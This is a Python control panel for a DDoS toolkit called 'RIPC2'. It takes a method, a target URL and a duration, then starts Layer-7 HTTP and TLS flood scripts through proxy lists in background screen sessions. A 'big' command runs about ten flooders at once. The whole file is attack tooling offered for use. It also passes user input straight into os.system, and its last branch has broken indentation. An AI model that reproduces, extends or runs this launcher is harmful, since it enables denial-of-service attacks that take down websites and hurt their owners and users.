# -*- coding: utf-8 -*-
from operator import index
import socket
import random
import string
import threading
import getpass
import urllib
import getpass
import colorama
import os,sys,time,re,requests,json
from requests import post
from time import sleep
from datetime import datetime, date
import codecs

author = ""

def prints(start_color, end_color, text):
    start_r, start_g, start_b = start_color
    end_r, end_g, end_b = end_color

    for i in range(len(text)):
        r = int(start_r + (end_r - start_r) * i / len(text))
        g = int(start_g + (end_g - start_g) * i / len(text))
        b = int(start_b + (end_b - start_b) * i / len(text))

        color_code = f"\033[38;2;{r};{g};{b}m"
        print(color_code + text[i], end="")
    
start_color = (255, 255, 255)
end_color = (0, 0, 255)

class Color:
    colorama.init()
    


def help():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""\033[36m
                         ⣇⣿⠘⣿⣿⣿⡿⡿⣟⣟⢟⢟⢝⠵⡝⣿⡿⢂⣼⣿⣷⣌⠩⡫⡻⣝⠹⢿⣿⣷
                         ⡆⣿⣆⠱⣝⡵⣝⢅⠙⣿⢕⢕⢕⢕⢝⣥⢒⠅⣿⣿⣿⡿⣳⣌⠪⡪⣡⢑⢝⣇
                         ⡆⣿⣿⣦⠹⣳⣳⣕⢅⠈⢗⢕⢕⢕⢕⢕⢈⢆⠟⠋⠉⠁⠉⠉⠁⠈⠼⢐⢕⢽
                         ⡗⢰⣶⣶⣦⣝⢝⢕⢕⠅⡆⢕⢕⢕⢕⢕⣴⠏⣠⡶⠛⡉⡉⡛⢶⣦⡀⠐⣕⢕
                         ⡝⡄⢻⢟⣿⣿⣷⣕⣕⣅⣿⣔⣕⣵⣵⣿⣿⢠⣿⢠⣮⡈⣌⠨⠅⠹⣷⡀⢱⢕
                         ⡝⡵⠟⠈⢀⣀⣀⡀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣼⣿⢈⡋⠴⢿⡟⣡⡇⣿⡇⡀⢕
                         ⡝⠁⣠⣾⠟⡉⡉⡉⠻⣦⣻⣿⣿⣿⣿⣿⣿⣿⣿⣧⠸⣿⣦⣥⣿⡇⡿⣰⢗⢄
                         ⠁⢰⣿⡏⣴⣌⠈⣌⠡⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣉⣉⣁⣄⢖⢕⢕⢕
                         ⡀⢻⣿⡇⢙⠁⠴⢿⡟⣡⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣵⣿
                         ⡻⣄⣻⣿⣌⠘⢿⣷⣥⣿⠇⣿⣿⣿⣿⣿⣿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                         ⣷⢄⠻⣿⣟⠿⠦⠍⠉⣡⣾⣿⣿⣿⣿⣿⣿⢸⣿⣦⠙⣿⣿⣿⣿⣿⣿⣿⣿⠟
                         ⡕⡑⣑⣈⣻⢗⢟⢞⢝⣻⣿⣿⣿⣿⣿⣿⣿⠸⣿⠿⠃⣿⣿⣿⣿⣿⣿⡿⠁⣠
                         ⡝⡵⡈⢟⢕⢕⢕⢕⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⠿⠋⣀⣈⠙
                         ⡝⡵⡕⡀⠑⠳⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢉⡠⡲⡫⡪⡪⡣

                              WELCOME TO RIPC2
                TYPE THE \033[36m[\033[32mMETHODS\033[36m] \033[36m[\033[32mURL\033[36m] \033[36m[\033[32mTIME\033[36m] \033[36m[\033[32mTHREADS\033[36m] TO START ATTACK
                         AUTHOR IN TELEGRAM : @XANDER
                         •   BOLT \033[36m[\033[32mL7\033[36m]    •   YOLO \033[36m[\033[32mL7\033[36m] 
                         •   OMG  \033[36m[\033[32mL7\033[36m]    •   TLS  \033[36m[\033[32mL7\033[36m]
                         •   NOX  \033[36m[\033[32mL7\033[36m]    •   BOT  \033[36m[\033[32mL7\033[36m]
                         •   404  \033[36m[\033[32mL7\033[36m]    •   big \033[36m[\033[32mL7\033[36m]
\033[0m""")



def main():
	os.system('cls' if os.name == 'nt' else 'clear')
	print("""\033[36m
                         ⣇⣿⠘⣿⣿⣿⡿⡿⣟⣟⢟⢟⢝⠵⡝⣿⡿⢂⣼⣿⣷⣌⠩⡫⡻⣝⠹⢿⣿⣷
                         ⡆⣿⣆⠱⣝⡵⣝⢅⠙⣿⢕⢕⢕⢕⢝⣥⢒⠅⣿⣿⣿⡿⣳⣌⠪⡪⣡⢑⢝⣇
                         ⡆⣿⣿⣦⠹⣳⣳⣕⢅⠈⢗⢕⢕⢕⢕⢕⢈⢆⠟⠋⠉⠁⠉⠉⠁⠈⠼⢐⢕⢽
                         ⡗⢰⣶⣶⣦⣝⢝⢕⢕⠅⡆⢕⢕⢕⢕⢕⣴⠏⣠⡶⠛⡉⡉⡛⢶⣦⡀⠐⣕⢕
                         ⡝⡄⢻⢟⣿⣿⣷⣕⣕⣅⣿⣔⣕⣵⣵⣿⣿⢠⣿⢠⣮⡈⣌⠨⠅⠹⣷⡀⢱⢕
                         ⡝⡵⠟⠈⢀⣀⣀⡀⠉⢿⣿⣿⣿⣿⣿⣿⣿⣼⣿⢈⡋⠴⢿⡟⣡⡇⣿⡇⡀⢕
                         ⡝⠁⣠⣾⠟⡉⡉⡉⠻⣦⣻⣿⣿⣿⣿⣿⣿⣿⣿⣧⠸⣿⣦⣥⣿⡇⡿⣰⢗⢄
                         ⠁⢰⣿⡏⣴⣌⠈⣌⠡⠈⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣬⣉⣉⣁⣄⢖⢕⢕⢕
                         ⡀⢻⣿⡇⢙⠁⠴⢿⡟⣡⡆⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣵⣵⣿
                         ⡻⣄⣻⣿⣌⠘⢿⣷⣥⣿⠇⣿⣿⣿⣿⣿⣿⠛⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                         ⣷⢄⠻⣿⣟⠿⠦⠍⠉⣡⣾⣿⣿⣿⣿⣿⣿⢸⣿⣦⠙⣿⣿⣿⣿⣿⣿⣿⣿⠟
                         ⡕⡑⣑⣈⣻⢗⢟⢞⢝⣻⣿⣿⣿⣿⣿⣿⣿⠸⣿⠿⠃⣿⣿⣿⣿⣿⣿⡿⠁⣠
                         ⡝⡵⡈⢟⢕⢕⢕⢕⣵⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⠿⠋⣀⣈⠙
                         ⡝⡵⡕⡀⠑⠳⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢉⡠⡲⡫⡪⡪⡣

                              WELCOME TO RIPC2
		   	 TYPE \033[36m[\033[32mHELP\033[36m] TO SEE OUR METHODS
                         AUTHOR IN TELEGRAM : @XANDER⠀⠀
\033[0m""")

#####FIX BY MIKA####
def attack_banner():
        print(f"""
\033[32m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[32m╔═╗╔═╗╔╗╔╔╦╗
\033[32m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗ \033[32m╚═╗║╣ ║║║ ║
\033[32m                         ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩ \033[32m╚═╝╚═╝╝╚╝ ╩
\033[32m                            ATTACK HAS BEEN STARTED!
\033[32m                 ╚╦═══════════════════════════════════════════╦╝
\033[32m           ╔═════╩═══════════════════════════════════════════╩═════╗
   \033[32m                TARGET     : [ {url} ]
  \033[32m                 TIME/S     : [ {time} ]
\033[32m           ╚═══════════════════════════════════════════════════════╝
  """)


while True:
		sys.stdout.write(f"\x1b]2;[\] RIPC2 :: Online Users: [1] :: Attack Sended: [1/10]\x07")
		sin = input("\033[0;30;46mRIPC2@PANEL\x1b[1;37m\033[0m:~# \x1b[1;37m\033[0m")
		sinput = sin.split(" ")[0]
		if sinput == "clear":
			os.system ("clear")
			main()
		if sinput == "cls" or sinput == "CLS":
			os.system ("clear")
			main()
		if sinput == "help" or sinput == "HELP" or sinput == ".help" or sinput == ".HELP" or sinput == "menu" or sinput == ".menu" or sinput == "MENU" or sinput == ".MENU":
			help()

#########LAYER-7########  
		elif sinput == "BOLT" or sinput == "bolt":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				attack_banner()
				os.system(f'screen -dm cd L7 && ./BOLT {url} {time} 512 10')
			except ValueError:
				print(f'URL + TIME')
			except IndexError:
				print(f'URL + TIME')

		elif sinput == "OMG" or sinput == "omg":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				attack_banner()
				os.system(f'screen -dm cd L7 && ./OMG GET {url} proxy.txt {time} 512 10')
			except ValueError:
				print(f'URL + TIME')
			except IndexError:
				print(f'URL + TIME')
			
		elif sinput == "YOLO" or sinput == "yolo":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				Rate = sin.split()[3]
				attack_banner()
				os.system(f'screen -dm node L7/YOLO.js {url} {time} 512 10 proxy.txt')
			except ValueError:
				print(f'URL + TIME')
			except IndexError:
				print(f'URL + TIME')

		elif sinput == "TLS" or sinput == "tls":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				attack_banner()
				os.system(f'screen -dm node L7/TLS.js GET {url} proxy.txt {time} 512 10')
			except ValueError:
				print(f'URL + TIME')
			except IndexError:
				print(f'URL + TIME')

		elif sinput == "NOX" or sinput == "nox":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				attack_banner()
				os.system(f'screen -dm node L7/NOX.js {url} {time} 64 10 proxy.txt')
			except ValueError:
				print(f'URL + TIME')
			except IndexError:
				print(f'URL + TIME')

		elif sinput == "BOT" or sinput == "bot":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				attack_banner()
				os.system(f'screen -dm node L7/BOT.js {url} {time} 512 5 proxy.txt')
			except ValueError:
				print(f'URL + TIME')
			except IndexError:
				print(f'URL + TIME')

		elif sinput == "404":
			try:
				url = sin.split()[1]
				time = sin.split()[2]
				attack_banner()
				os.system(f'screen -dm node L7/404.js {url} {time} 512 5 proxy.txt')
			except ValueError:
				print(f'URL + TIME')
			except IndexError:
				print(f'URL + TIME')
				
		elif sinput == "big":		
		        try:
			        url = sin.split()[1]
			        time = sin.split()[2]
			        attack_banner()
			        os.system(f'screen -dm node Nuker.js {url} {time} 30 proxy.txt 512')
                                os.system(f'screen -dm node BOT.js {url} {time} 512 30 proxy.txt')
                                os.system(f'screen -dm node 404.js {url} {time} 512 30 proxy.txt')
                                os.system(f'screen -dm node spank.js {url} {time} 30 proxy.txt')
                                os.system(f'screen -dm node YOLO.js {url} {time} 512 30 proxy.txt')
                                os.system(f'screen -dm node NOX.js {url} {time} 512 30 proxy.txt')                
                                os.system(f'screen -dm node tls-nig.js {url} {time} 512 30 proxy.txt')                
                                os.system(f'screen -dm node TLS.js {url} {time} 512 30')                
                                os.system(f'screen -dm node TLS-VIP.js {url} {time} 512 30 proxy.txt')                
                                os.system(f'screen -dm node bypass.js {url} {time} 512 30 proxy.txt')
                        except ValueError:
                                print(f'URL + TIME')
                        except IndexError:
                                print(f'URL + TIME')

	
